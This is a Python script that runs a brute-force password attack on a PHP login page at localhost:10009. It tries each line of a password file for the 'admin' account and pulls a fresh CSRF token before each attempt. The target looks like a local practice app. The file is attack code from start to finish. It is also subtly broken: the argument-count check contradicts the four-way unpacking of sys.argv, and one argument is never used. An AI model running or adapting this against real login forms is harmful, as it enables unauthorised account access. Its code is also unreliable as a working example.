import sys
import requests
from bs4 import BeautifulSoup
import time

if len(sys.argv) != 3:
    print("Usage: python script.py password_file_path success_message")
    sys.exit(1)

script, passw, initToken, success_message = sys.argv

target_url = 'http://localhost:10009/login.php'
session = requests.Session()
cookies = {'PHPSESSID': 'a7cb442347e58a79c119d95e62690f5e'}


try:
    response = session.get(target_url, cookies=cookies)
    soup = BeautifulSoup(response.text, 'html.parser')
    print(soup)
    csrf_token = soup.find('input', {'name': 'user_token'})['value']

    print(f"Target URL: {target_url}")
    print(f"CSRF Token: {csrf_token}")

    with open(passw, 'r') as password_file:
        print('Running brute force attack...')
        for password in password_file:
            password = password.strip()  

            payload = {'username': 'admin', 'password': password, 'user_token': csrf_token}
            print(success_message)
            login_response = session.post(target_url, cookies=cookies, data=payload)
            print(login_response.text)
            if success_message in login_response.text:
                print(f"Success! Password is: {password}")
                break

            #Extract new CSRF token for next attempt
            soup = BeautifulSoup(login_response.text, 'html.parser')
            csrf_token = soup.find('input', {'name': 'user_token'})['value']
            print(f"CSRF Token after attempt: {csrf_token}")
            time.sleep(3)
            

        else:
            print('Brute force attack failed. No matches found.')

except requests.RequestException as e:
    print(f"Error: {e}")
    sys.exit(1)
except Exception as ex:
    print(f"Unexpected error: {ex}")
    sys.exit(1)
